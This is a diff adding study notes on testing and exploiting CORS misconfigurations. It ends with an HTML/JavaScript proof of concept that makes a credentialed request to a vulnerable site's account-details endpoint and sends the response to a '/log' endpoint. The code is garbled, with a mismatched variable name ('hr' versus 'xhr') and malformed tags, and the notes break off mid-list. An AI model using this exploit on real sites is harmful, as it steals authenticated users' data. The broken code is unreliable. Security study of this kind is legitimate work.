@@ -29,3 +29,45 @@ Content-Length: 15
 If origin header is said to wildcard then credentials cannot be false for security reasons
 
 
+Blackbox Testing of this misconfiguration:
+
+* Map the application 
+* Test the application for dynamic generation
+    - Does it refelct ACAO headers or not.(changing the values of the headers of the website)
+    - some use regex to validate the string.
+    - Does it allow null origin
+    - Does it restrict the protocol
+    - Does it allow passing the credentials
+* once cors is found determine the impact of it.
+
+White box
+
+* Determine the frameworks used.
+* find out if that stack allows for cors configuration 
+* review code to identify any misconfiguration in cors rules
+
+
+Exploitation 
+
+* If the application allows for credentials.
+    - This it the poc used
+``` <html> ‹body›
+        <h1›Hello World!‹/h1>
+        <scripts>
+        var hr = new XMLHttpRequest () ;
+        var url = "<https://vulnerable-site.com>"
+        xhr.onreadystatechange = function() {
+             if (xhr.readyState == XMLHttpRequest.DONE) {
+            fetch("/log?key=" + xhr.responseText)
+            }
+        }
+        xhr.open ('GET', url + "/accountDetails", true);
+        xhr.withCredentials = true;
+        xhr.send (null);
+        ‹/script> </bodv>
+
+     </html>
+```
+
+* if the application does not allow for credentials.
+    -
